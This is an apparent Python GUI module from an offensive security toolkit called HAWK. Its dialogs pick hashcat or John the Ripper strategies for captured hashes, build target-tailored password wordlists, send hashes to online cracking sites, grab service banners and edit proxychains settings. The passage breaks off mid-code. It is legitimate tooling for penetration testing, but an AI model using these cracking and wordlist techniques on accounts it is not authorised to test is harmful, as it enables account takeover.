# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Dialogs v1.0
- Greenbone install: 10-second countdown popup watching xterm for password
- Selectable text: CTkTextbox (disabled) for all technical content
- OS detection dialog fixed (grab_set)
- Netcat with service-specific verification commands
"""

import os
import re
import time
import threading
import subprocess
import shlex
import json
import tempfile
import shutil
import socket
import pathlib
import urllib.request

from gui.dialogs_common import *

class HashCrackDialog:
    def __init__(self, parent, cred, cred_idx: int, callback=None):
        from utils.session import detect_hash_type
        self._cred=cred; self._idx=cred_idx; self._callback=callback
        self._tool_var=ctk.StringVar(value="hashcat")
        detected=detect_hash_type(cred.hash_val)
        self._mode_var=ctk.StringVar(
            value=detected if detected in HASH_MODES else list(HASH_MODES.keys())[0])
        win = _make_win(parent, "Hash Cracking", 540, 400)
        _title(win, "HASH CRACKING")
        h = cred.hash_val[:52]+"..." if len(cred.hash_val)>52 else cred.hash_val
        _selectable_text(win, h, color=COLORS["text_bright"], height=32)
        _note_box(win, f"★ Auto-detected type: {detected}", COLORS["text_green"])
        _divider(win)
        for tn, label in [("hashcat","Hashcat (GPU — recommended)"),
                           ("john","John the Ripper (CPU)")]:
            rf = ctk.CTkFrame(win, fg_color="transparent")
            rf.pack(anchor="w", padx=50, pady=3)
            ctk.CTkRadioButton(rf, text=label, variable=self._tool_var, value=tn,
                               font=_f("md"), text_color=COLORS["text_dim"],
                               fg_color=COLORS["border_green"],
                               border_color=COLORS["border_dim"]).pack(side="left")
        _sub(win, "Hash type:")
        ctk.CTkOptionMenu(win, values=list(HASH_MODES.keys()), variable=self._mode_var,
                          width=340, height=32, font=_f("md"),
                          fg_color=COLORS["bg_card"], button_color=COLORS["border_dim"],
                          dropdown_fg_color=COLORS["bg_secondary"],
                          dropdown_text_color=COLORS["text_bright"],
                          text_color=COLORS["text_dim"], corner_radius=3).pack(pady=6)
        row = _btn_row(win)
        _btn(row, "START CRACKING", self._confirm, primary=True, w=150)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))
        self._win = win

    def _confirm(self):
        mode_num = HASH_MODES.get(self._mode_var.get(),{}).get("mode","0")
        _safe_destroy(self._win)
        if self._callback:
            self._callback(self._cred, self._idx, self._tool_var.get(), mode_num)


class NoPortsFoundDialog:
    """Dialog shown when an Nmap scan completes without open ports."""

    def __init__(self, parent, tool_name: str, target: str, callback_deeper=None):
        self._callback_deeper = callback_deeper or (lambda: None)
        win = self._win = _make_win(parent, "No Open Ports Found", 560, 300)
        _title(win, "No Open Ports Found")
        _sub(win, f"{tool_name} did not report open ports on {target}.")
        _note_box(
            win,
            "This does not always mean the host is down. Possible causes: firewall filtering, "
            "services on non-standard ports, UDP-only exposure, or the scanned range was too small.",
            color=COLORS["text_dim"],
            selectable=False,
        )
        _recommended(win, "Run NMAP Full (-p-) or verify connectivity with a targeted service scan")
        row = _btn_row(win)
        _btn(row, "RUN DEEPER SCAN", self._run_deeper, primary=True, w=170)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=110)

    def _run_deeper(self):
        try:
            self._callback_deeper()
        finally:
            _safe_destroy(self._win)


class QuickServiceProbeDialog:
    """
    Lightweight, pure-socket banner grabber. No external tool required —
    useful when nmap is too heavy or the user wants a quick sanity check.
    Sends a service-specific payload, reads up to 512 bytes, displays
    the raw response with a one-line interpretation.
    """

    PAYLOADS = {
        "ssh":        b"",                                    # server speaks first
        "ftp":        b"",
        "smtp":       b"EHLO hawk.local\r\n",
        "pop3":       b"",
        "imap":       b"",
        "http":       b"HEAD / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        "https":      b"HEAD / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        "redis":      b"INFO\r\n",
        "mysql":      b"",                                    # 4-byte length + greeting
        "telnet":     b"",
        "rdp":        b"",
    }

    PORT_TO_KIND = {
        22: "ssh", 21: "ftp", 25: "smtp", 110: "pop3", 143: "imap",
        80: "http", 8080: "http", 443: "https", 8443: "https",
        6379: "redis", 3306: "mysql", 23: "telnet", 3389: "rdp",
    }

    def __init__(self, parent, target: str, port: int, svc: str):
        self._target = target
        self._port   = port
        self._svc    = (svc or "").lower().split("?")[0].strip()
        self._kind   = self._svc if self._svc in self.PAYLOADS \
                        else self.PORT_TO_KIND.get(port, "")

        win = _make_win(parent, f"Quick Probe — {target}:{port}", 620, 460)
        self._win = win
        _title(win, f"Quick Probe  —  {target}:{port}/{svc or 'unknown'}")
        _sub(win,
             f"Sends a {self._kind or 'raw TCP'} payload and grabs up to 512 bytes. "
             "No external tools. Safe on lab networks.")

        self._out = ctk.CTkTextbox(
            win, height=220, font=_f("md"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_green"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, wrap="word")
        self._out.pack(fill="both", expand=True, padx=24, pady=(6, 6))
        self._out.insert("1.0", "(press PROBE to start)")
        self._out.configure(state="disabled")

        self._status = ctk.CTkLabel(
            win, text="", font=_f("sm"), text_color=COLORS["text_dim"])
        self._status.pack(fill="x", padx=24, pady=(0, 4))

        row = _btn_row(win)
        _btn(row, "PROBE",   self._run_probe, primary=True, w=120)
        _btn(row, "COPY",    self._copy_output, w=100)
        _btn(row, "CLOSE",   lambda: _safe_destroy(win), w=100)

    def _run_probe(self):
        self._status.configure(text="Connecting...",
                               text_color=COLORS["text_yellow"])
        self._win.update_idletasks()
        import threading
        t = threading.Thread(target=self._probe_worker, daemon=True)
        t.start()

    def _probe_worker(self):
        import socket
        payload = self.PAYLOADS.get(self._kind, b"")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((self._target, self._port))
            if payload:
                try:
                    s.sendall(payload)
                except Exception:
                    pass
            try:
                data = s.recv(512)
            except socket.timeout:
                data = b""
            try:
                s.close()
            except Exception:
                pass
            text = data.decode("utf-8", errors="replace") if data else \
                   "(connection established, no data received)"
            interp = self._interpret(text)
            self._win.after(0, self._render, text, interp, True)
        except socket.timeout:
            self._win.after(0, self._render, "",
                            "Timeout — port may be filtered.", False)
        except ConnectionRefusedError:
            self._win.after(0, self._render, "",
                            "Connection refused — port is closed.", False)
        except Exception as e:
            self._win.after(0, self._render, "", f"Error: {e}", False)

    def _interpret(self, text: str) -> str:
        low = text.lower()
        if "ssh-" in low:
            m = re.search(r'(ssh-[\d.]+-\S+)', low)
            return f"✓ SSH confirmed: {m.group(1) if m else 'banner OK'}"
        if "220 " in text and ("ftp" in low or self._kind == "ftp"):
            return "✓ FTP confirmed (220 greeting)"
        if "http/" in low:
            m = re.search(r'server:\s*([^\r\n]+)', text, re.I)
            return f"✓ HTTP confirmed — Server: {m.group(1)}" if m else \
                   "✓ HTTP confirmed"
        if "220" in text and "smtp" in low:
            return "✓ SMTP confirmed"
        if "+ok" in low or "-err" in low:
            return "✓ POP3/IMAP confirmed"
        if "redis" in low or "NOAUTH" in text or "PONG" in text:
            return "✓ Redis confirmed"
        if text and not text.startswith("("):
            return "? Unknown banner — see raw output"
        return "? No banner — service may be silent or filtered"

    def _render(self, raw: str, interp: str, ok: bool):
        self._out.configure(state="normal")
        self._out.delete("1.0", "end")
        body = f"── RAW RESPONSE ({len(raw)} bytes) ──\n{raw}\n\n── INTERPRETATION ──\n{interp}"
        self._out.insert("1.0", body)
        self._out.configure(state="disabled")
        self._status.configure(
            text=interp,
            text_color=COLORS["text_green"] if ok else COLORS["text_red"])

    def _copy_output(self):
        try:
            from utils.clipboard import clipboard_copy
            txt = self._out.get("1.0", "end-1c")
            clipboard_copy(txt)
            self._status.configure(text="Copied to clipboard",
                                   text_color=COLORS["text_green"])
        except Exception:
            pass


class BackgroundJobDialog:
    """Toast-style popup shown when a background job (hydra, gobuster,
    nuclei, etc.) finishes. Surfaces a short result summary and lets the
    user jump to the full output via a callback (typically a terminal
    section header that the runner has already written).
    """

    def __init__(self, parent, job_label: str, summary: str, callback=None):
        self._callback = callback or (lambda: None)
        win = self._win = _make_win(
            parent, f"BG Job Finished — {job_label}", 560, 280)
        _title(win, f"✓  {job_label}")
        _sub(win, "Background job finished.")

        # Keep the summary short and selectable so the user can grab
        # a line or two without flipping to the main terminal.
        body = (summary or "Completed.").strip()
        if len(body) > 1200:
            body = body[:1200] + "\n…(truncated — see terminal for full output)"
        _note_box(win, body,
                  color=COLORS["border_green"], selectable=True)

        row = _btn_row(win)
        _btn(row, "VIEW IN TERMINAL", self._view, primary=True, w=180)
        _btn(row, "DISMISS", lambda: _safe_destroy(win), w=110)

    def _view(self):
        try:
            self._callback()
        finally:
            _safe_destroy(self._win)


def show_crack_strategy_dialog(parent, app, cred, cred_idx,
                                on_strategy_chosen):
    """Main crack dialog.  Shows device banner, smart recommendation
    banner, then a radio selector with 7 strategies each annotated
    with its time estimate on the current hardware.

    `on_strategy_chosen(strategy, extra_ctx)` is invoked when the
    user clicks USE.  `strategy` ∈ {FAST, RULE-BASED, HYBRID, TARGET,
    MASK, FULL STACK, CRACK ONLINE}.
    """
    from utils.crack_runner import detect_devices
    from utils.crack_recommendations import recommend

    dev = detect_devices()

    sess_ctx = {}
    try:
        sess = app.session_manager.current
        if sess:
            sess_ctx = {
                "target_domain":    getattr(sess, "target_domain", ""),
                "company_name":     "",
                "discovered_users": list(getattr(
                    sess, "discovered_users", []) or []),
            }
    except Exception:
        pass

    cred_dict = {
        "username":  cred.username,
        "hash_type": cred.hash_type,
        "services":  cred.services or [],
        "host":      cred.host,
    }
    recs = recommend(cred_dict, dev, sess_ctx, [])

    win = _make_win(parent, "Crack Hash — pick a strategy", 860, 820)
    _title(win, "🔓  CRACK HASH")
    _sub(win,
         f"{cred.username or '(no user)'}  ·  "
         f"{cred.hash_type or 'Unknown'}  ·  "
         f"{(cred.host or 'no host')[:40]}",
         COLORS["text_dim"])

    _outer = win
    body = ctk.CTkScrollableFrame(
        _outer, fg_color="transparent",
        scrollbar_button_color=COLORS["border_dim"],
        scrollbar_button_hover_color=COLORS["border_green"])
    body.pack(fill="both", expand=True, padx=0, pady=(0, 2))

    dev_color = (COLORS["border_green"] if dev.get("has_gpu")
                 else COLORS["border_amber"])
    _note_box(body, dev.get("summary", ""), dev_color)

    if recs:
        top = recs[0]
        ctk.CTkLabel(
            body, text="  ★  HAWK SUGGESTS",
            font=_f("md", True),
            text_color=COLORS["text_cyan"],
            anchor="w",
        ).pack(fill="x", padx=24, pady=(8, 2))
        rec_frame = ctk.CTkFrame(
            body, fg_color=COLORS["bg_card"],
            border_color=COLORS["text_cyan"],
            border_width=2, corner_radius=4)
        rec_frame.pack(fill="x", padx=24, pady=(0, 8))
        ctk.CTkLabel(
            rec_frame,
            text=f"  → {top['strategy']}   "
                 f"(est. {top.get('est_time', '?')})",
            font=_f("md", True),
            text_color=COLORS["text_cyan"],
            anchor="w",
        ).pack(fill="x", padx=10, pady=(8, 2))
        ctk.CTkLabel(
            rec_frame, text=top.get("reason", ""),
            font=_f("sm"), text_color=COLORS["text_bright"],
            anchor="w", justify="left", wraplength=770,
        ).pack(fill="x", padx=10, pady=(0, 6))

    ctk.CTkLabel(
        body, text="  ◇  CHOOSE STRATEGY",
        font=_f("md", True), text_color=COLORS["text_bright"],
        anchor="w",
    ).pack(fill="x", padx=24, pady=(10, 4))

    _STRATEGIES = [
        ("FAST",
         "john + rockyou.  Fastest, catches password already in the "
         "wordlist exactly.  No mutations.",
         "3-8 min CPU", "30s-1 min GPU"),
        ("RULE-BASED",
         "hashcat + best64.rule + rockyou.  Mutates each word "
         "(Admin → Admin123!, Welcome → W3lcome1).  ~80% of enforced-"
         "complexity admin passwords.",
         "9-14 min CPU", "30s-2 min GPU"),
        ("HYBRID",
         "hashcat -a 6, top-100k words + numeric/symbol suffix "
         "(?d?d?s).  Targets 'word' + '12!', '99@', '2024!'.",
         "5-10 min CPU", "1-3 min GPU"),
        ("TARGET",
         "CUPP-style custom dict built from company name, domain, "
         "usernames, year range.  Slow to build, very fast to run.  "
         "Gold against service accounts.",
         "1-3 min after dict build", "seconds GPU"),
        ("MASK",
         "hashcat -a 3, structural brute with a known pattern "
         "(e.g. ?u?l?l?l?d?d?s).  Only use if you know the shape.",
         "3 min (7ch) / 70 min (8ch)", "20s / 5 min GPU"),
        ("FULL STACK",
         "Runs FAST → RULE-BASED → HYBRID → TARGET in sequence, "
         "stops the moment anything hits.  Set & forget.",
         "25-35 min CPU", "2-5 min GPU"),
        ("CRACK ONLINE",
         "Submit the hash to hashes.com / crackstation / "
         "onlinehashcrack.  Bypasses local CPU limits entirely.",
         "seconds (if in DB)", "seconds (if in DB)"),
    ]

    strategy_var = ctk.StringVar(
        value=(recs[0]["strategy"] if recs else "RULE-BASED"))

    for sid, desc, cpu_t, gpu_t in _STRATEGIES:
        row_fr = ctk.CTkFrame(
            body, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3)
        row_fr.pack(fill="x", padx=24, pady=3)

        hdr = ctk.CTkFrame(row_fr, fg_color="transparent")
        hdr.pack(fill="x", padx=8, pady=(6, 0))
        is_top = recs and sid == recs[0]["strategy"]
        ctk.CTkRadioButton(
            hdr, text="", variable=strategy_var, value=sid,
            width=20, font=_f("sm"),
            fg_color=COLORS["border_green"],
            border_color=COLORS["border_dim"],
        ).pack(side="left")
        ctk.CTkLabel(
            hdr, text=sid + ("  ★" if is_top else ""),
            font=_f("md", True),
            text_color=(COLORS["text_cyan"] if is_top
                        else COLORS["text_bright"]),
            anchor="w",
        ).pack(side="left", padx=6)

        ctk.CTkLabel(
            row_fr, text=desc,
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", justify="left", wraplength=780,
        ).pack(fill="x", padx=32, pady=(0, 2))

        est = cpu_t if not dev.get("has_gpu") else gpu_t
        ctk.CTkLabel(
            row_fr,
            text=f"  ⏱  est. on your setup: {est}",
            font=_f("xs"),
            text_color=COLORS["text_yellow"],
            anchor="w",
        ).pack(fill="x", padx=32, pady=(0, 6))

    win = _outer

    def _use():
        strat = strategy_var.get()
        _safe_destroy(win)
        on_strategy_chosen(strat, {"cred_idx": cred_idx})

    row = _btn_row(win)
    _btn(row, "USE THIS STRATEGY", _use, primary=True, w=220)
    _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)


def show_target_profile_dialog(parent, app, cred,
                                 on_dict_built):
    """Collects company / domain / seeds / year range + build
    options, then writes the wordlist via build_dict()."""
    default_domain = ""
    default_users = []
    try:
        sess = app.session_manager.current
        if sess:
            default_domain = getattr(sess, "target_domain", "") or ""
            default_users = list(getattr(
                sess, "discovered_users", []) or [])
    except Exception:
        pass

    win = _make_win(parent,
                    "TARGET — build a custom dict", 680, 620)
    _title(win, "🧬  TARGET PROFILE — build custom wordlist")
    _sub(win,
         "Give HAWK the context it needs to generate candidates "
         "humans actually pick.",
         COLORS["text_dim"])

    _note_box(
        win,
        "The dict is written to <HAWK>/dicts/dict-target-<ts>.txt and "
        "fed to hashcat with best64.rule (or HAWK's inline fallback "
        "if the system install lacks rules).  Typical yield: 20-50k "
        "candidates.  Runs in 1-3 min on CPU against a NetNTLMv2 hash.",
        COLORS["border_dim"])

    company_var = ctk.StringVar(value="")
    domain_var  = ctk.StringVar(value=default_domain)
    seeds_var   = ctk.StringVar(value="")
    year_from_var = ctk.StringVar(value="2020")
    year_to_var   = ctk.StringVar(value="2025")
    leet_var = ctk.BooleanVar(value=True)

    def _row(label, var, hint=""):
        fr = ctk.CTkFrame(win, fg_color="transparent")
        fr.pack(fill="x", padx=24, pady=(4, 0))
        ctk.CTkLabel(
            fr, text=label, width=120, anchor="w",
            font=_f("sm", True),
            text_color=COLORS["text_bright"],
        ).pack(side="left")
        e = ctk.CTkEntry(
            fr, textvariable=var, font=_f("md"), height=30,
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"],
            border_width=1, corner_radius=3)
        e.pack(side="left", fill="x", expand=True)
        add_context_menu(e)
        if hint:
            ctk.CTkLabel(
                win, text=hint, font=_f("xs"),
                text_color=COLORS["text_dim"],
                anchor="w", wraplength=600,
            ).pack(fill="x", padx=24, pady=(0, 2))

    _row("Company name", company_var,
         "e.g. 'ACME Corp' — seeds 'ACME', 'Acme', 'acme!', "
         "'Acme2024!', etc.")
    _row("Domain", domain_var,
         "AD realm (e.g. corp.local).  Pulled from session if set.")
    _row("Extra seeds", seeds_var,
         "Space-separated — project codenames, office names, "
         "anything target-specific.")

    yr_fr = ctk.CTkFrame(win, fg_color="transparent")
    yr_fr.pack(fill="x", padx=24, pady=(4, 0))
    ctk.CTkLabel(
        yr_fr, text="Year range", width=120, anchor="w",
        font=_f("sm", True),
        text_color=COLORS["text_bright"],
    ).pack(side="left")
    ctk.CTkEntry(
        yr_fr, textvariable=year_from_var, width=80, height=30,
        font=_f("md"),
        fg_color=COLORS["bg_card"],
        text_color=COLORS["text_bright"],
        border_color=COLORS["border_green"],
        border_width=1, corner_radius=3,
    ).pack(side="left", padx=(0, 2))
    ctk.CTkLabel(yr_fr, text="→", font=_f("md"),
                 text_color=COLORS["text_dim"]).pack(side="left")
    ctk.CTkEntry(
        yr_fr, textvariable=year_to_var, width=80, height=30,
        font=_f("md"),
        fg_color=COLORS["bg_card"],
        text_color=COLORS["text_bright"],
        border_color=COLORS["border_green"],
        border_width=1, corner_radius=3,
    ).pack(side="left", padx=(2, 0))
    ctk.CTkLabel(
        win,
        text="  Each year generates 'seed2024!', 'Winter2024!' etc.",
        font=_f("xs"), text_color=COLORS["text_dim"],
        anchor="w").pack(fill="x", padx=24, pady=(0, 2))

    ctk.CTkCheckBox(
        win, text="Include l33t variants (admin → @dmin, @dmin!)",
        variable=leet_var, font=_f("sm"),
        text_color=COLORS["text_bright"],
        fg_color=COLORS["border_green"],
        border_color=COLORS["border_dim"],
        checkmark_color=COLORS["bg_primary"],
    ).pack(anchor="w", padx=24, pady=(8, 4))

    if default_users:
        _note_box(
            win,
            f"HAWK will also seed from {len(default_users)} "
            f"discovered user(s) in the session (auto-included).",
            COLORS["border_dim"])

    def _build():
        import os as _os
        import time as _time
        from utils.target_profile_dict import build_dict
        from utils.config import DICTS_DIR
        try:
            yf = int(year_from_var.get().strip() or "2020")
            yt = int(year_to_var.get().strip() or "2025")
        except ValueError:
            yf, yt = 2020, 2025
        seeds = [s for s in (seeds_var.get() or "").split() if s]
        # Write the target profile dict inside HAWK's own tree
        # (<HAWK>/dicts/) so everything the app generates stays
        # together under the directory the user cloned / runs from —
        # no more ~/hawk/ scatter.  DICTS_DIR is created at import
        # time in utils/config.py.
        try:
            _os.makedirs(DICTS_DIR, exist_ok=True)
        except Exception:
            pass
        ts = _time.strftime("%Y%m%d-%H%M%S")
        out_path = _os.path.join(DICTS_DIR, f"dict-target-{ts}.txt")
        try:
            path, n = build_dict(
                out_path,
                company=company_var.get().strip(),
                domain=domain_var.get().strip(),
                usernames=default_users,
                extra_seeds=seeds,
                year_from=yf, year_to=yt,
                include_leet=leet_var.get())
        except Exception as e:
            try:
                app.terminal.write(
                    f"  [!] target dict build failed: {e}",
                    "error")
            except Exception:
                pass
            return
        try:
            app.terminal.write(
                f"  [+] target dict built: {path}  "
                f"({n:,} candidates)", "success")
        except Exception:
            pass
        _safe_destroy(win)
        on_dict_built(path, n)

    row = _btn_row(win)
    _btn(row, "BUILD DICT + START TARGET", _build,
         primary=True, w=280)
    _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)


def show_online_crack_dialog(parent, app, cred,
                               on_api_chosen, on_browser_chosen):
    """Pick an online cracking service.  Two callbacks because API
    services need a key prompt flow; browser services just copy-
    clipboard + open URL."""
    from utils.online_crack import SERVICES

    ht = cred.hash_type or "Unknown"
    win = _make_win(parent,
                    "Crack Online — service picker", 760, 640)
    _title(win, "🌐  CRACK ONLINE")
    _sub(win,
         f"{cred.username or '(no user)'}  ·  {ht}",
         COLORS["text_dim"])

    _note_box(
        win,
        "Online services usually hit common/reused passwords in "
        "seconds by cross-referencing huge breach DBs.  API-based "
        "services need a key (free tiers available); browser-based "
        "ones open the site with the hash copied to your clipboard — "
        "you paste & drive.",
        COLORS["border_dim"])

    _outer = win
    body = ctk.CTkScrollableFrame(
        _outer, fg_color="transparent",
        scrollbar_button_color=COLORS["border_dim"],
        scrollbar_button_hover_color=COLORS["border_green"])
    body.pack(fill="both", expand=True, padx=0, pady=(0, 2))

    for sid, svc in SERVICES.items():
        supported = ht in svc.get("supports", [])
        fr = ctk.CTkFrame(
            body, fg_color=COLORS["bg_card"],
            border_color=(COLORS["border_green"] if supported
                          else COLORS["border_dim"]),
            border_width=1, corner_radius=3)
        fr.pack(fill="x", padx=24, pady=4)

        ctk.CTkLabel(
            fr,
            text=(f"  {svc['name']}"
                  + (f"   ({svc['mode'].upper()})"
                     if svc['mode'] == 'api' else "")),
            font=_f("md", True),
            text_color=(COLORS["text_green"] if supported
                        else COLORS["text_dim"]),
            anchor="w",
        ).pack(fill="x", padx=8, pady=(6, 2))

        ctk.CTkLabel(
            fr, text=svc.get("desc", ""),
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", justify="left", wraplength=680,
        ).pack(fill="x", padx=8, pady=(0, 2))

        compat = (f"  Supports: {', '.join(svc.get('supports', []))}"
                  + ("   ← hash type supported" if supported
                     else "   ⚠ doesn't support this hash type"))
        ctk.CTkLabel(
            fr, text=compat,
            font=_f("xs"),
            text_color=(COLORS["text_dim"] if supported
                        else COLORS["text_red"]),
            anchor="w",
        ).pack(fill="x", padx=8, pady=(0, 4))

        btn_row = ctk.CTkFrame(fr, fg_color="transparent")
        btn_row.pack(fill="x", padx=8, pady=(0, 6))

        def _make_cb(sid_=sid, svc_=svc):
            def _submit():
                _safe_destroy(win)
                if svc_['mode'] == 'api':
                    on_api_chosen(sid_)
                else:
                    on_browser_chosen(sid_)
            return _submit

        label = ("SUBMIT VIA API" if svc['mode'] == 'api'
                 else "OPEN BROWSER + COPY HASH")
        _btn(btn_row, label, _make_cb(),
             primary=supported, w=240)

    win = _outer
    row = _btn_row(win)
    _btn(row, "CLOSE", lambda: _safe_destroy(win), w=120)


def show_api_key_prompt(parent, app, service_id: str,
                          on_key_ready):
    """Session-volatile API key prompt.  Stores the key on
    `app._online_crack_keys[service_id]`; optional per-session
    persistence via checkbox."""
    from utils.online_crack import SERVICES
    svc = SERVICES.get(service_id, {})
    name = svc.get("name", service_id)
    get_key_url = svc.get("get_key_url")

    win = _make_win(parent,
                    f"{name} — API key needed", 620, 420)
    _title(win, f"🔑  {name} — API key")

    _note_box(
        win,
        f"HAWK needs your {name} API key to submit hashes through "
        "the API.\n\n"
        "The key lives IN MEMORY only — it disappears when you close "
        "HAWK.  Tick 'Save to this session' to ALSO write it into "
        "the current session's JSON (per-session persistence, no "
        "global config).",
        COLORS["border_dim"])

    if get_key_url:
        _selectable_text(
            win, f"Get a key:  {get_key_url}",
            color=COLORS["text_cyan"], height=32)

    key_var = ctk.StringVar(value="")
    save_var = ctk.BooleanVar(value=False)

    fr = ctk.CTkFrame(win, fg_color="transparent")
    fr.pack(fill="x", padx=24, pady=(8, 2))
    ctk.CTkLabel(
        fr, text="Key:", width=60, anchor="w",
        font=_f("sm", True),
        text_color=COLORS["text_bright"],
    ).pack(side="left")
    entry = ctk.CTkEntry(
        fr, textvariable=key_var, font=_f("md"), height=32,
        show="*",
        fg_color=COLORS["bg_card"],
        text_color=COLORS["text_bright"],
        border_color=COLORS["border_green"],
        border_width=1, corner_radius=3)
    entry.pack(side="left", fill="x", expand=True)
    add_context_menu(entry)

    ctk.CTkCheckBox(
        win,
        text="Save to this session's JSON file (per-session only)",
        variable=save_var, font=_f("sm"),
        text_color=COLORS["text_dim"],
        fg_color=COLORS["border_green"],
        border_color=COLORS["border_dim"],
        checkmark_color=COLORS["bg_primary"],
    ).pack(anchor="w", padx=24, pady=(8, 4))

    def _submit():
        k = (key_var.get() or "").strip()
        if not k:
            return
        store = getattr(app, "_online_crack_keys", None)
        if store is None:
            store = {}
            app._online_crack_keys = store
        store[service_id] = k

        if save_var.get():
            try:
                sess = app.session_manager.current
                if sess:
                    keys = getattr(sess, "_online_crack_keys", None)
                    if keys is None:
                        keys = {}
                        sess._online_crack_keys = keys
                    keys[service_id] = k
                    if hasattr(sess, "_touch"):
                        sess._touch()
            except Exception as e:
                print(f"[HAWK] session api-key save failed: {e}")

        _safe_destroy(win)
        on_key_ready(k)

    row = _btn_row(win)
    _btn(row, "SUBMIT", _submit, primary=True, w=140)
    _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)


def show_crack_progress_dialog(parent, app, strategy_name,
                                 on_stop):
    """Live output dialog shown while a crack strategy runs.

    Returns the window; the caller pushes lines via
    `win.append_line(msg)` and ends with `win.close_success(msg)` or
    `win.close_failure(msg)`."""
    win = _make_win(parent,
                    f"Cracking — {strategy_name}", 760, 520)
    _title(win, f"🔓  CRACKING  ·  {strategy_name}")
    _sub(win, "Live output — don't close this dialog unless you "
              "want to abort.", COLORS["text_dim"])

    box = ctk.CTkTextbox(
        win, font=_f("sm"),
        fg_color=COLORS["bg_card"],
        text_color=COLORS["text_green"],
        border_color=COLORS["border_dim"],
        border_width=1, corner_radius=3, wrap="word")
    box.pack(fill="both", expand=True, padx=14, pady=(6, 6))

    status_var = ctk.StringVar(value="running…")
    ctk.CTkLabel(
        win, textvariable=status_var, font=_f("sm", True),
        text_color=COLORS["text_yellow"]).pack(pady=(2, 4))

    def _append(line: str):
        try:
            box.configure(state="normal")
            box.insert("end", line + "\n")
            box.see("end")
            box.configure(state="disabled")
        except Exception:
            pass

    def _close_ok(msg: str):
        status_var.set(msg)
        win.after(1500, lambda: _safe_destroy(win))

    def _close_fail(msg: str):
        status_var.set(msg)

    def _do_stop():
        """STOP click — signal the runner, then close the dialog on
        a short timer regardless of whether the subprocess actually
        honours SIGTERM.  Without this forced close the dialog hangs
        on 'stopping…' forever if john's .rec file is locked or
        hashcat is inside a long kernel dispatch (both common on CPU-
        only Kali VMs)."""
        try:
            on_stop()
        except Exception:
            pass
        status_var.set("stopping…  (force-closing in 2s)")
        # CrackRunner.kill() escalates SIGTERM→SIGKILL after 2s; give
        # it a hair more slack, then drop the dialog.
        win.after(2500, lambda: _safe_destroy(win))

    row = _btn_row(win)
    _btn(row, "STOP", _do_stop, danger=True, w=120)
    _btn(row, "CLOSE", lambda: _safe_destroy(win), w=120)

    win.append_line   = _append
    win.close_success = _close_ok
    win.close_failure = _close_fail
    return win


def show_proxychains_config_dialog(parent, app=None, on_save=None):
    """Guided editor for /etc/proxychains4.conf.

    Shows the current ProxyList entry, lets the user pick type / IP /
    port, validates the selection, then writes the file (direct write if
    root, else writes content to hawkc/tmp then sudo-moves it via xterm).
    on_save() is called after a successful write so the caller can
    refresh any state-display widgets (e.g. the PROXY button in target_bar).
    """
    import os as _os
    import shlex as _shlex
    from utils.config import TMP_DIR

    _CONF_PATHS = ["/etc/proxychains4.conf", "/etc/proxychains.conf"]

    def _find_conf() -> str:
        for p in _CONF_PATHS:
            if _os.path.isfile(p):
                return p
        return _CONF_PATHS[0]

    def _read_conf(path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                return fh.read()
        except Exception:
            return ""

    def _current_proxy(content: str) -> tuple:
        """Return (ptype, ip, port) of first active ProxyList entry."""
        in_list = False
        for line in content.splitlines():
            s = line.strip()
            if s == "[ProxyList]":
                in_list = True
                continue
            if in_list and s and not s.startswith("#"):
                parts = s.split()
                if len(parts) >= 3 and parts[0] in ("socks4", "socks5", "http"):
                    return (parts[0], parts[1], parts[2])
        return ("socks5", "127.0.0.1", "1080")

    def _build_new_content(old_content: str,
                           ptype: str, ip: str, port: str) -> str:
        """Replace [ProxyList] section, preserving all other settings."""
        lines = old_content.splitlines()
        new_lines = []
        in_list = False
        list_written = False
        for line in lines:
            if line.strip() == "[ProxyList]":
                in_list = True
                new_lines.append(line)
                continue
            if in_list:
                s = line.strip()
                if s and not s.startswith("#"):
                    new_lines.append(f"# {line}")
                else:
                    new_lines.append(line)
                if not list_written:
                    new_lines.append(f"{ptype}\t{ip}\t{port}")
                    list_written = True
            else:
                new_lines.append(line)
        if not list_written:
            new_lines.append("\n[ProxyList]")
            new_lines.append(f"{ptype}\t{ip}\t{port}")
        return "\n".join(new_lines) + "\n"

    conf_path    = _find_conf()
    conf_content = _read_conf(conf_path)
    cur_type, cur_ip, cur_port = _current_proxy(conf_content)

    # ── Window ────────────────────────────────────────────────────────
    win = _make_win(parent, "Proxychains Config", 800, 720)
    _title(win, "🔗  PROXYCHAINS — proxy configuration")
    _sub(win, f"Editing: {conf_path}", COLORS["text_dim"])

    # ── Scrollable body (all content except status + buttons) ─────────
    body = ctk.CTkScrollableFrame(win, fg_color="transparent",
                                  corner_radius=0)
    body.pack(fill="both", expand=True, padx=0, pady=(2, 0))

    # ── Info note ─────────────────────────────────────────────────────
    _note_box(body,
        "proxychains4 routes any TCP tool's traffic through this SOCKS proxy.\n"
        "The tunnel MUST already be running before you click SET PROXY — "
        "see the HOW TO CREATE A TUNNEL section below for setup commands.\n"
        "The original file is backed up before every write.",
        COLORS["text_yellow"])

    # ── Current proxy ─────────────────────────────────────────────────
    cur_frame = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                             border_color=COLORS["border_dim"],
                             border_width=1, corner_radius=4)
    cur_frame.pack(fill="x", padx=16, pady=(4, 4))
    ctk.CTkLabel(cur_frame,
